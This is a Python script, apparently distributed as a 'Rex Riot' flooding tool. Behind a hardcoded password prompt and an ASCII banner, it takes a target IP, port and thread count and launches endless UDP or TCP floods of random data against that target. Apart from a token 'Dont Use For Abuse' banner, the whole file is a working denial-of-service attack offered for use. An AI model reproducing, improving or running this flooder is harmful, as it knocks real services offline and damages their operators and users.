#Credit By RetZ
import random
import socket
import threading
import os, sys
import time

password = input("[•] Account :")
time.sleep(2)
if password=="RetZ":
  print("[√] Done Use The Account")
  time.sleep(2)
  os.system("clear")
  print("\033[1;32;40m>> Code By RetZ. <<")
  time.sleep(1)
  print("\033[1;32;40m>> Rex Riot Community <<")
  time.sleep(1)
  print("\033[1;32;40m>> Dont Use For Abuse <<")
  time.sleep(3)
  os.system("clear")
  print('''\033[1;31;40m
██████╗░███████╗██╗░░██╗░░░░░░
██╔══██╗██╔════╝╚██╗██╔╝░░░░░░
██████╔╝█████╗░░░╚███╔╝░█████╗
██╔══██╗██╔══╝░░░██╔██╗░╚════╝
██║░░██║███████╗██╔╝╚██╗░░░░░░
╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝░░░░░░

██████╗░██╗░█████╗░████████╗
██╔══██╗██║██╔══██╗╚══██╔══╝
██████╔╝██║██║░░██║░░░██║░░░
██╔══██╗██║██║░░██║░░░██║░░░
██║░░██║██║╚█████╔╝░░░██║░░░
╚═╝░░╚═╝╚═╝░╚════╝░░░░╚═╝░░░''')
  
  choice = str(input("\033[1;36;40mReady Attack? \033[1;31;40m(y/n) :"))
  ip = str(input("\033[1;36;40mIp Target \033[1;31;40m===> :"))
  port = int(input("\033[1;36;40mPort Target \033[1;31;40m===> :"))
  times = int(input("\033[1;36;40mSend Packets \033[1;31;40m===> :"))
  threads = int(input("\033[1;36;40mSend Threads \033[1;31;40m===> :"))
  def rex():
  	data = random._urandom(811)
  	while True:
  		try:
  			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  			addr = (str(ip),int(port))
  			for x in range(times):
  				s.sendto(data,addr)
  				s.sendto(data,addr)
  				s.sendto(data,addr)
  				s.sendto(data,addr)
  				s.sendto(data,addr)
  			print("\033[1;31;40mRex Riot Attack This Ip %s Port %s."%(ip,port))
  		except:
  			print("\033[1;36;40m× Warning!")
  
  def rex2():
  	data = random._urandom(102400)
  	while True:
  		try:
  			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  			s.connect((ip,port))
  			s.send(data)
  			for x in range(times):
  				s.send(data)
  			print("\033[1;36;40m× Warning!")
  		except:
  			s.close()
  			print("\033[1;36;40m× Warning!")
              
  for y in range(threads):
  	if choice == 'y':
  		th = threading.Thread(target = rex)
  		th.start()
  	else:
  		th = threading.Thread(target = rex2)
  		th.start()
  		th.start()
else:
  print("\033[1;31;40m[!] Wrong Password!")
